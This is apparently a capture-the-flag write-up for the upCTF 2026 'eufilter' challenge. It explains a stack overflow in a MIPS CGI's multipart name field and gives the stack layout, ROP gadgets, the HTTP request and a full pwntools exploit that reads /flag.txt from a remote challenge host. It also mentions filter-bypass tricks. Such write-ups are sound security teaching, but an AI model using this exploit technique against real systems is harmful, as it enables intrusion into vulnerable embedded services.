# eufilter — upCTF 2026

**Category:** PWN (MIPS ROP)
**Flag:** `upCTF{jus7_s4y_1ts_f0r_7h3_ch1ldr3n-gBDUIEk0b1a10c12}`

## TL;DR

CGI "EU Safe Browsing Gateway" with a MIPS big-endian binary executed via QEMU. The identity verification form (multipart POST) has a stack buffer overflow in the `name` field with no size limit. ROP chain using gadgets intentionally planted in a `selftest` function (dead code): `open("/flag.txt") → read(fd, buf, 256) → write(1, buf, 256)` via direct MIPS syscalls.

---

## Analysis

### Infrastructure

```
Ubuntu 24.04 + busybox httpd + QEMU user-mode (MIPS)
ELF 32-bit MSB, MIPS32 rel2, dynamically linked, not stripped, NO PIE
```

### Application Flow

| Method | Path | Handler | Action |
|--------|------|---------|--------|
| GET | `/cgi-bin/eufilter.cgi?url=X` | `handle_check` | `strstr(url, blocklist[i])` → allowed.html or verify.html |
| POST | `/cgi-bin/eufilter.cgi` | `handle_verify` | Reads multipart body → `parse_multipart` → redirect /denied.html |

**Blocklist:** discord.com, instagram.com, tiktok.com, snapchat.com, twitter.com, x.com, reddit.com, twitch.tv

**Web filter bypass (red herring):** `strstr` is case-sensitive and `get_param` does not decode URL encoding. `Discord.com` or `disc%6frd.com` pass. But this does not yield the flag.

### Vulnerability: Stack Buffer Overflow (CWE-121)

In `handle_verify`, the buffer for the multipart form `name` field is allocated on the stack:

```c
// handle_verify @ 0x400f1c
char name_buf[64];  // fp+0x34, only 0x40 bytes
// ...
parse_multipart(g_body, body_len, boundary, name_buf);
```

In `parse_multipart`, the `name` field is copied with `memcpy` **without checking the size**:

```c
// parse_multipart @ 0x400c48
data_len = end_boundary - data_start;  // no limit
memcpy(name_buf, data_start, data_len); // overflow!
```

### Stack Layout of handle_verify

```
fp+0x34: name_buf[0..63]  ← memcpy destination (we control)
fp+0x78: saved fp          ← offset 68 from name_buf
fp+0x7c: saved ra          ← offset 72 from name_buf (return address!)
fp+0x80: [past the frame]  ← sp points here after the epilogue
```

**Epilogue of handle_verify:**
```mips
move sp, fp         # sp = fp
lw   ra, 0x7c(fp)  # ra = our value
lw   fp, 0x78(fp)  # fp = our value
addiu sp, sp, 0x80  # sp = fp + 0x80
jr   ra             # jump to our gadget with sp pointing to our chain
```

### ROP Gadgets: `selftest` Function

The `selftest` function (0x400a5c) immediately jumps to `selftest_end`, leaving dead code with planted gadgets:

```
0x400a74: lw v0, 8(sp); lw ra, 0xc(sp); sp+=0x10; jr ra  # set syscall number
0x400a8c: lw a0, 8(sp); lw ra, 0xc(sp); sp+=0x10; jr ra  # set arg0
0x400aa4: lw a1, 8(sp); lw ra, 0xc(sp); sp+=0x10; jr ra  # set arg1
0x400abc: lw a2, 8(sp); lw ra, 0xc(sp); sp+=0x10; jr ra  # set arg2
0x400aec: syscall; lw ra, 8(sp); sp+=0x10; jr ra          # execute syscall
```

Each gadget consumes a 16-byte frame from the stack:
```
sp+0x0: pad
sp+0x4: pad
sp+0x8: value to load into register
sp+0xc: address of next gadget (ra)
```

### String `/flag.txt`

The `id_photo` multipart field is copied to `g_id_photo` (0x411740 in BSS). We place `/flag.txt\0` there and use that address as the argument for `open()`.

---

## Exploit

### ROP Chain

```
open("/flag.txt", 0)    →  syscall 4005, a0=0x411740, a1=0
read(3, 0x511744, 256)  →  syscall 4003, a0=3, a1=g_body, a2=0x100
write(1, 0x511744, 256) →  syscall 4004, a0=1, a1=g_body, a2=0x100
```

fd=3 hardcoded (stdin=0, stdout=1, stderr=2, next available fd=3).

### Payload Structure

```
[68 bytes padding] [fake fp] [gadget_lw_v0]  ← overflow ra
[frame: v0=4005] [frame: a0=g_id_photo] [frame: a1=0] [frame: syscall]  ← open
[frame: v0=4003] [frame: a0=3] [frame: a1=buf] [frame: a2=256] [frame: syscall]  ← read
[frame: v0=4004] [frame: a0=1] [frame: a1=buf] [frame: a2=256] [frame: syscall]  ← write
```

### Delivery via Multipart POST

```http
POST /cgi-bin/eufilter.cgi?url=x HTTP/1.1
Content-Type: multipart/form-data; boundary=----B

------B
Content-Disposition: form-data; name="name"

<68 bytes padding + ROP chain>
------B
Content-Disposition: form-data; name="id_photo"; filename="p.jpg"
Content-Type: image/jpeg

/flag.txt\x00
------B--
```

### Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import struct, re

def p32be(x): return struct.pack('>I', x)

LW_V0=0x400a74; LW_A0=0x400a8c; LW_A1=0x400aa4; LW_A2=0x400abc; SYSCALL=0x400aec

def frame(val, nxt):
    return p32be(0)*2 + p32be(val) + p32be(nxt)

payload  = b'A'*68 + p32be(0x41414141) + p32be(LW_V0)       # overflow ra
payload += frame(4005, LW_A0) + frame(0x411740, LW_A1)       # open args
payload += frame(0, SYSCALL)  + frame(LW_V0, 0)              # open syscall
payload += frame(4003, LW_A0) + frame(3, LW_A1)              # read args
payload += frame(0x511744, LW_A2) + frame(0x100, SYSCALL)    # read syscall
payload += frame(LW_V0, 0)                                    # bridge
payload += frame(4004, LW_A0) + frame(1, LW_A1)              # write args
payload += frame(0x511744, LW_A2) + frame(0x100, SYSCALL)    # write syscall
payload += p32be(0)*8

body  = b'------B\r\nContent-Disposition: form-data; name="name"\r\n\r\n'
body += payload + b'\r\n------B\r\n'
body += b'Content-Disposition: form-data; name="id_photo"; filename="p.jpg"\r\n'
body += b'Content-Type: image/jpeg\r\n\r\n/flag.txt\x00\r\n------B--\r\n'

s = remote("46.225.117.62", 30001)
req = f"POST /cgi-bin/eufilter.cgi?url=x HTTP/1.1\r\nHost: x\r\n"
req += f"Content-Type: multipart/form-data; boundary=----B\r\n"
req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
s.send(req.encode() + body); sleep(2)
data = s.recv(16384, timeout=5); s.close()
m = re.search(rb'upCTF\{[^\}]+\}', data)
if m: log.success(f"FLAG: {m.group().decode()}")
```

```bash
python3 solve.py          # LOCAL
python3 solve.py REMOTE   # REMOTE
```

---

## Discarded Approaches

| # | Approach | Why it did not work |
|---|----------|---------------------|
| 1 | Web filter bypass (case / URL-encoding) | Works for the bypass, but there is no flag in the static HTML pages |
| 2 | CRLF injection in Location header | busybox httpd handles it correctly, not injectable |
| 3 | Overflow g_id_photo in BSS | The size check (`< 0x100001`) prevents overflow, and g_id_photo grows forward (not toward blocklist) |

---

## Key Lessons

1. **A "web challenge" can be PWN** — a CGI hidden in MIPS with ROP gadgets planted in dead code
2. **MIPS ROP is clean**: each gadget consumes a fixed 16-byte frame with `sp+=0x10`, making chains predictable
3. **Hardcoded fd works in CGI**: since each request is a new process, stdin(0)/stdout(1)/stderr(2) are taken and the next `open()` always returns fd=3
4. **Multipart without bounds check** is a classic: `memcpy(dst, src, attacker_controlled_len)` with no size validation
5. **`selftest` as a gadget farm**: an innocuous name for a function that only contains useful ROP gadgets and a branch that skips them

## References

- [MIPS Linux syscall table](https://syscalls.mebeim.net/?table=mips/o32)
- [MIPS calling convention](https://en.wikipedia.org/wiki/MIPS_architecture#Calling_conventions)
